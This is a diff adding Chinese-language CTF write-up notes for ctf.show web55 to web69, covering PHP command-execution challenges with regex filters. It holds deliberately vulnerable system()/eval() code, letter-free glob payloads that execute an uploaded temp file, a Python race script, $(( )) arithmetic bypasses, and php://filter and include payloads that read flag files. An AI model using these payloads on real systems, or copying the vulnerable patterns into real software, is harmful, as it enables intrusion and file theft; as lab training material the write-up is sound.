@@ -1811,6 +1811,602 @@ grep${IFS}%27fla%27${IFS}f???????%0a
 
 
 
+#### web55
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 20:03:51
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤了
+
+```
+\;|[a-z]|\`|\%|\x09|\x26|\>|\</
+```
+
+这题涉及到一个知识点
+
+也就是**无字母数字的命令执行**
+
+https://blog.csdn.net/qq_46091464/article/details/108513145
+
+https://blog.csdn.net/qq_46091464/article/details/108557067
+
+[无字母数字webshell之提高篇 | 离别歌](https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html)
+
+思路
+
+> 1. shell下可以利用`.`来执行任意脚本
+> 2. Linux文件名支持用glob通配符代替
+
+我们可以通过post一个文件(文件里面的sh命令)，在上传的过程中，通过`.(点)`去执行执行这个文件。(形成了条件竞争)。一般来说这个文件在linux下面保存在`/tmp/php??????`一般后面的6个字符是随机生成的有大小写。（可以通过linux的匹配符去匹配）
+
+> ```
+> 注意：通过`.`去执行sh命令不需要有执行权限
+> ```
+
+
+
+1.构造post数据包
+
+```html
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>POST数据包POC</title>
+</head>
+<body>
+<form action="http://f3a86e62-7402-4d1d-b950-0d6da4aa4eab.challenge.ctf.show/" method="post" enctype="multipart/form-data">
+<!--链接是当前打开的题目链接-->
+    <label for="file">文件名：</label>
+    <input type="file" name="file" id="file"><br>
+    <input type="submit" name="submit" value="提交">
+</form>
+</body>
+</html>
+```
+
+在上传的文件里面写入sh指令
+
+```sh
+#!/bin/sh
+ls
+```
+
+
+
+2.抓包
+
+![image-20241127181502002](assets/image-20241127181502002.png)
+
+
+
+3.构造执行sh命令的poc
+
+详细解释poc的构造：
+
+https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html#glob
+
+我们这里可以理解为我们这道题里面的干扰文件名都是由小写字母组成的，所有文件名都是小写，只有PHP生成的临时文件包含大写字母，那我们就可以构造出如下的poc
+
+```
+?c=.+/???/????????[@-[]
+```
+
+注：后面的`[@-[]`是linux下面的匹配符，是进行匹配的大写字母。
+![在这里插入图片描述](https://i-blog.csdnimg.cn/blog_migrate/fcbf237f846ebf0be65c4c9aceaf3714.png#pic_center)
+
+
+
+我们就来吧
+
+![image-20241127233056280](assets/image-20241127233056280.png)
+
+修改一下指令内容即可得到flag
+
+![image-20241127233144783](assets/image-20241127233144783.png)
+
+#### web56
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\</i", $c)){
+        system($c);
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+> \;|[a-z]|[0-9]|\\$|\(|\{|\'|\"|\`|\%|\x09|\x26|\>|\<
+
+这题相比上一题多过滤了一个数字，不影响我们上题的解题方法
+
+这里不再赘述
+
+放个大佬的脚本
+
+```python
+import requests
+
+while True:
+	url = "http://a88c904d-6cd4-4eba-b7e9-4c37e0cf3a7d.chall.ctf.show/?c=.+/???/????????[@-[]"
+	r = requests.post(url, files={"file": ('feng.txt', b'cat flag.php')})
+	if r.text.find("flag") > 0:
+		print(r.text)
+		break
+
+```
+
+#### web57
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-08 01:02:56
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+// 还能炫的动吗？
+//flag in 36.php
+if(isset($_GET['c'])){
+    $c=$_GET['c'];
+    if(!preg_match("/\;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/i", $c)){
+        system("cat ".$c.".php");
+    }
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+过滤条件增加
+
+> \;|[a-z]|[0-9]|\`|\|\#|\'|\"|\`|\%|\x09|\x26|\x0a|\>|\<|\.|\,|\?|\*|\-|\=|\[/
+
+这道题把`?`过滤了，但是我们可以看到
+
+```
+system("cat ".$c.".php");
+```
+
+这题会将我们传入的get参数进行拼接后再执行
+
+题目里有个暗示
+
+```
+//flag in 36.php
+```
+
+也就是说我们要用符号构造出36
+
+我们可以利用linux的$(())构造出36
+
+在linux里面$(())=0，$((~ $(()) ))=-1
+
+其中~符号表示取反，这里0的取反等于－1
+
+也就是我们先将36个-1加起来再取反得到我们需要的36
+
+payload:
+
+```
+c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))
+```
+
+![image-20241128205205756](assets/image-20241128205205756.png)
+
+从而得到flag
+
+
+
+#### web58
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+payload:
+
+```
+c=highlight_file("flag.php");
+c=include($_POST['w']);&w=php://filter/convert.base64-encode/resource=flag.php //文件包含，得到的回显需要进行base64解码
+c=show_source('flag.php');
+```
+
+
+
+#### web59
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+解法与上题一致，不再赘述
+
+（没搞懂两题有什么区别）
+
+#### web60
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+解法依旧与web58一致
+
+可能我太菜了看不出有什么区别
+
+#### web61
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+依旧web58
+
+#### web62
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+依旧...
+
+#### web62
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+依旧......
+
+#### web63
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+依旧......
+
+
+
+#### web64
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+嘶，怎么还是那样...
+
+
+
+#### web65
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+同上...
+
+#### web66
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+本来以为还是一样的，没想到...
+
+![image-20241128215426797](assets/image-20241128215426797.png)
+
+看来我们要想办法查目录了
+
+我们可以尝试利用php中查询目录的函数
+
+比如 scandir()
+
+![image-20241128233043919](assets/image-20241128233043919.png)
+
+```
+var_dump(scandir('/'));
+```
+
+![image-20241128233314034](assets/image-20241128233314034.png)
+
+接下来就是查flag，可以通过文件包含来查
+
+![image-20241128233701394](assets/image-20241128233701394.png)
+
+flag.txt前面记得加上/
+
+#### web67
+
+```php
+<?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: Lazzaro
+# @Date:   2020-09-05 20:49:30
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-07 22:02:47
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+// 你们在炫技吗？
+if(isset($_POST['c'])){
+        $c= $_POST['c'];
+        eval($c);
+}else{
+    highlight_file(__FILE__);
+}
+```
+
+这题解法与web66一致
+
+#### web68
+
+![image-20241128234343226](assets/image-20241128234343226.png)
+
+这题貌似只是show_source和highlight_file用不了，其他没什么变化
+
+可以直接用前两题的方法
+
+也可以直接
+
+```
+c=include('/flag.txt') //赌
+```
+
+#### web69
+
+![image-20241128234507588](assets/image-20241128234507588.png)
+
+
+
+这题print_r() 和 var_dump() 都被禁用
+
+我们可以通过寻找其他可以打印数组的函数来打印目录
+
+
+
+------
+
+
+
 ### **文件包含**
 
 > 以PHP为例,常用的文件包含函数有以下四种include(),require(),include_once(),require_once()
